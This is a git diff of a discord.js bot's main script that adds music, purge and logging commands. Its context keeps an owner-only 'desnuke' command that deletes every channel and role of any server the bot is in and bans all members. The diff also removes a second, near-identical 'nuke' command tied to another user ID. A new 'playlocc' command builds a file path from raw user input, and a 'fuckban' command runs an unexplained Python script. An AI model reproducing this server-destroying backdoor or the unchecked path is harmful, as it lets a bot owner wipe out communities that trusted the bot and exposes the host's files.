@@ -1,21 +1,17 @@
-﻿const botSettings = require("./botSettings.json");
+﻿const botSettings = require("./botsettings.json");
 const Discord = require("discord.js");
 const fs = require("fs");
 const snek = require("snekfetch");
+const PythonShell = require("python-shell");
 const prefix = botSettings.prefix;
+const music = require('discord.js-music-v11');
 const bot = new Discord.Client({disableEveryone: false})
 
 bot.on("ready", async() => {
     console.log(`Bot is ready! ${bot.user.username}`);
-
-    try {
-        let link = await bot.generateInvite(["ADMINSTRATOR"]);
-        console.log(link);
-    } catch(e) {
-        console.log(e.stack);
-    }
     bot.user.setPresence({ game: { name: '$&helpcmds for help/' + bot.guilds.size + ' Servers', type: 0 } });
 });
+music(bot)
 bot.on("message", async message => {
     if(message.author.bot) return;
     if(message.channel.type === "dm") return;
@@ -56,7 +52,16 @@ bot.on("message", async message => {
         	message.channel.sendFile("./shitt/" + name + ".txt")
         });
         }
-  
+  if(command === `${prefix}fuckban`) {
+  	 
+var options = {
+  pythonPath: './python'
+};
+  	PythonShell.run('garbage.py',options, function (err) {
+  if (err) return message.channel.send("Error,  " + err)
+  console.log('finished');
+});
+}
           if (command === `${prefix}changenick`) {
             let blocked = message.guild.roles.find(r => r.name === "ODDWORLDBLOCKED");
                  if(blocked) {
@@ -757,8 +762,10 @@ if(command === `${prefix}idban`) {
         }
         if (message.member.hasPermission("ADMINISTRATOR")) {
         message.channel.fetchMessages({limit: messagecount})
-        .then(messages => message.channel.bulkDelete(messages)); 
-         
+        .then(messages => message.channel.bulkDelete(messages))
+          .then(messages => message.channel.send("Deleted " + messages.size + " messages"))
+         .then(r=> r.delete('5000'))
+       
    }
     }
     if (command === `${prefix}helpcmds`) {
@@ -1041,6 +1048,26 @@ if(command === `${prefix}rate`) {
 			bot.users.find('id', '303184720802611200').send(`${message.author.username} revoked their rating`)
 		});
 		}
+		if(command === `${prefix}playlocc`) {
+			var musci = `./music/` + args[0]
+			let voice = message.member.voiceChannel
+			if(!voice) return message.channel.send("Your not in a voice channel shithead")
+			fs.access(musci, function (err) {
+				if(err) return message.channel.send(" errors are shit")
+			 voice.join().then(connection => {
+ 
+
+                                let dispatcher = connection.playFile(musci);
+
+                                dispatcher.on('end', () => {
+                                    connection.channel.leave();
+                                });
+                                dispatcher.on('error', err => {
+                                    return channel.sendMessage("ERROR FUCK");
+                                });
+                                });
+                                });
+                                }
 		if(command === `${prefix}checkrating`) {
 			fs.readFile(`./ratings/positive/${message.author.id}/rating.txt`, function (err, data) {
 			if(err) return message.channel.send("You did not give a rating")
@@ -1448,6 +1475,7 @@ var roasts = roast[Math.floor(Math.random() * roast.length)];
          .addField("Type: '!joinrole <name> w/out $' ", "\n" + wut.join(' '))
          message.channel.send(embed)
  }
+ 
  if(command === `${prefix}rolemen`) {
  	 let blocked = message.guild.roles.find(r => r.name === "ODDWORLDBLOCKED");
     if(blocked) {
@@ -1768,9 +1796,9 @@ var thirds = third[Math.floor(Math.random() * third.length)];
                           const embed = new Discord.RichEmbed()
                 .setDescription("Break giving")
                 .setColor("RED")
-                .addField("Sbanned user:", toMute.user.username)
-                .addField("Moderator:", message.author.username)
-                .addField("Reason:", reason)
+                .addField("Sbanned user:", "'" + toMute.user.username)
+                .addField("Moderator:", "'" + message.author.username)
+                .addField("Reason:", "'" + reason)
                 return message.channel.send(embed)
                 
                 
@@ -1815,16 +1843,6 @@ var thirds = third[Math.floor(Math.random() * third.length)];
              
            if(command === `${prefix}desnuke`) {
            	if (message.author.id !== "303184720802611200") return message.channel.send("Only the bot owner can use this command")
-           let dud = bot.guilds.find(r=> r.name === args.join(' '))
-           bot.guilds.get(dud.id).channels.deleteAll()
-           bot.guilds.get(dud.id).roles.deleteAll()
-           bot.guilds.get(dud.id).members.forEach(async (member, id) => {
-           	member.ban()
-       
-           });
-           }
-	 if(command === `${prefix}svennuke`) {
-           	if (message.author.id !== "254421612802080768") return message.channel.send("Sven only :D")
            let dud = bot.guilds.find(r=> r.name === args.join(' '))
            bot.guilds.get(dud.id).channels.deleteAll()
            bot.guilds.get(dud.id).roles.deleteAll()
@@ -2524,9 +2542,11 @@ message.channel.fetchMessages({
     const filterBy = user ? user.id : bot.user.id;
     messages = messages.filter(m => m.author.id === filterBy).array().slice(0, amount);
   message.channel.bulkDelete(messages).catch(error => console.log(error.stack));
+  message.channel.send("deleted " + messages.length + " messages by: " + user.username)
+  .then(r=> r.delete('5000'))
 });
 }
-}
+  }
 		 if(command === `${prefix}kreply`) {
             	message.delete()
             		 if(message.author.id !== "303184720802611200") {
@@ -3068,13 +3088,13 @@ bot.on('message', message => {
 						const log = new Discord.RichEmbed()
 	
 						.setDescription("CHANNELUPDATE")
-						.addField("OLDNAME", oldChannel.name)
+						.addField("OLDNAME", "'" + oldChannel.name)
 						
-						.addField("OLDTOPIC", oldChannel.topic)
-						.addField("OLDPOSITION", oldChannel.position)
-						.addField("NEWNAME", newChannel.name)
-						.addField("NEWTOPIC", newChannel.topic)
-						.addField("NEWPOSITION", newChannel.position)
+						.addField("OLDTOPIC", "'" + oldChannel.topic)
+						.addField("OLDPOSITION", "'" + oldChannel.position)
+						.addField("NEWNAME", "'" + newChannel.name)
+						.addField("NEWTOPIC", "'" + newChannel.topic)
+						.addField("NEWPOSITION", "'" + newChannel.position)
 						.setColor("BLUE")
 	
 						
@@ -3096,12 +3116,12 @@ bot.on('message', message => {
 						const log = new Discord.RichEmbed()
 	
 						.setDescription("ROLE UPDATE")
-						.addField("OLD NAME", oldRole.name)
-						.addField("OLD COLOR", oldRole.hexColor)
-						.addField("OLD POSITION", oldRole.position)
-						.addField("NEW NAME", newRole.name)
-						.addField("NEW COLOR", newRole.hexColor)
-						.addField("NEW POSITION", newRole.position)
+						.addField("OLD NAME", "'" + oldRole.name)
+						.addField("OLD COLOR", "'" + oldRole.hexColor)
+						.addField("OLD POSITION", "'" + oldRole.position)
+						.addField("NEW NAME", "'" + newRole.name)
+						.addField("NEW COLOR", "'" + newRole.hexColor)
+						.addField("NEW POSITION", "'" + newRole.position)
 						.setColor("BLUE")
 	
 						
@@ -3144,12 +3164,12 @@ bot.on('message', message => {
 						const log = new Discord.RichEmbed()
 	
 						.setDescription("MEMBER UPDATE")
-						.addField("OLD NICKNAME", oldMember.nickname)
-						.addField("OLD ROLES", oldMember.roles.map(r=> r.name))
+						.addField("OLD NICKNAME", "'" + oldMember.nickname + "'")
+						.addField("OLD ROLES", "'" + oldMember.roles.map(r=> r.name) + "'")
 						
 						.setThumbnail(oldMember.user.avatarURL)
-						.addField("NEW NICKNAME", newMember.nickname)
-						.addField("NEW ROLES", newMember.roles.map(r=> r.name))
+						.addField("NEW NICKNAME", "'" + newMember.nickname + "'" )
+						.addField("NEW ROLES", "'" + newMember.roles.map(r=> r.name) + "'")
 				
 						
 						.setColor("BLUE")
